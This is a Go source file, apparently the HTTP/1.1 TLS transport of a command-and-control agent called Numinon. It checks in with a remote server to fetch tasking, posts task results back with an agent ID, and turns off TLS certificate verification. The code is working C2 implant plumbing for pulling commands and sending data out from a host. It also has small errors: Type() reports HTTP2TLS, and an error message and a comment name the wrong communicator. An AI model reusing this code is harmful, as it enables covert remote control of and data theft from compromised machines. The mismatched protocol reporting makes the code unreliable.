package comm

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"numinon_shadow/internal/agent/config"
)

var _ Communicator = (*Http1TLSCommunicator)(nil)

type Http1TLSCommunicator struct {
	agentConfig config.AgentConfig
	httpClient  *http.Client
}

func NewHttp1TLSCommunicator(cfg config.AgentConfig) (*Http1TLSCommunicator, error) {
	err := BasicValidateH1TLS(cfg)
	if err != nil {
		return nil, err
	}

	log.Printf("|COMM INIT|-> Initializing HTTP/1.1 TLS Communicator for %s:%s%s", cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{
		Transport: transport,
	}

	return &Http1TLSCommunicator{
		agentConfig: cfg,
		httpClient:  client,
	}, nil

}

func BasicValidateH1TLS(cfg config.AgentConfig) error {
	if cfg.Protocol != config.HTTP1TLS {
		return fmt.Errorf("mismatched config: NewHttp1ClearCommunicator called with protocol %s", cfg.Protocol)
	}
	if cfg.ServerIP == "" || cfg.ServerPort == "" || cfg.CheckInEndpoint == "" {
		return fmt.Errorf("config requires ServerIP, ServerPort, and CheckInEndpoint")
	}
	return nil
}

func (c *Http1TLSCommunicator) Connect() error {
	log.Printf("|COMM %s|-> Connect() called. Typically no-op for HTTP/1.1.", c.agentConfig.Protocol)
	return nil
}

func (c *Http1TLSCommunicator) Disconnect() error {
	log.Printf("|COMM %s|-> Disconnect() called.", c.agentConfig.Protocol)
	return nil
}

// CheckIn performs a GET request to the CheckInEndpoint to fetch tasks.
// Returns the raw response body which might contain tasking information.
func (c *Http1TLSCommunicator) CheckIn() ([]byte, error) {
	// CONSTRUCT THE TARGET URL
	targetURL := url.URL{
		Scheme: "https",
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.CheckInEndpoint,
	}
	fullURL := targetURL.String()

	// CREATE THE REQUEST
	var req *http.Request
	var err error
	log.Printf("|COMM %s|-> Checking in via GET to %s", c.agentConfig.Protocol, fullURL)

	req, err = http.NewRequest(http.MethodGet, fullURL, nil)

	if err != nil {
		log.Printf("|❗ERR COMM %s| Failed to create check-in request: %v", c.agentConfig.Protocol, err)
		return nil, fmt.Errorf("failed to create %s check-in request: %w", c.agentConfig.Protocol, err)
	}

	// SET HEADERS
	req.Header.Set("User-Agent", "NuminonAgent/0.1-Checkin")
	req.Header.Set("Agent-ID", c.agentConfig.UUID)

	// EXECUTE THE REQUEST
	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("|❗ERR COMM H1TLS| Check-in request failed: %v", err)
		return nil, fmt.Errorf("http check-in request failed: %w", err)
	}
	defer resp.Body.Close()

	log.Printf("|COMM H1TLS|-> Check-in response: Status=%s, Proto=%s", resp.Status, resp.Proto)

	// READ RESPONSE (COULD CONTAIN INSTRUCTIONS)
	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("|❗ERR COMM H1TLS| Failed to read check-in response body: %v", err)
		return nil, fmt.Errorf("failed to read check-in response body: %w", err)
	}

	log.Printf("|COMM H1TLS|-> Successfully read %d bytes from check-in response", len(responseBody))
	return responseBody, nil
}

// SendResult performs a POST request to the ResultsEndpoint to submit task results.
func (c *Http1TLSCommunicator) SendResult(resultData []byte) error {
	// CONSTRUCT THE TARGET URL
	targetURL := url.URL{
		Scheme: "https", // Hardcoded for H1C
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.ResultsEndpoint,
	}
	fullURL := targetURL.String()
	log.Printf("|COMM H1TLS|-> Sending %d bytes of results via POST to %s", len(resultData), fullURL)

	// CREATE THE HTTP POST REQUEST
	req, err := http.NewRequest(http.MethodPost, fullURL, bytes.NewReader(resultData))
	if err != nil {
		log.Printf("|❗ERR COMM H1TLS| Failed to create results request: %v", err)
		return fmt.Errorf("failed to create http results request: %w", err)
	}

	// SET THE HEADERS
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "NuminonAgent/0.1-Result")
	req.Header.Set("Agent-ID", c.agentConfig.UUID)

	// EXECUTE THE REQUEST
	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("|❗ERR COMM H1TLS| Results POST request failed: %v", err)
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close() // Close body even if we don't read it, to release resources

	log.Printf("|COMM H1TLS|-> Results POST response: Status=%s, Proto=%s", resp.Status, resp.Proto)

	log.Printf("|COMM H1TLS|-> Successfully sent results.")
	return nil
}

func (c *Http1TLSCommunicator) Type() config.AgentProtocol {
	return config.HTTP2TLS
}
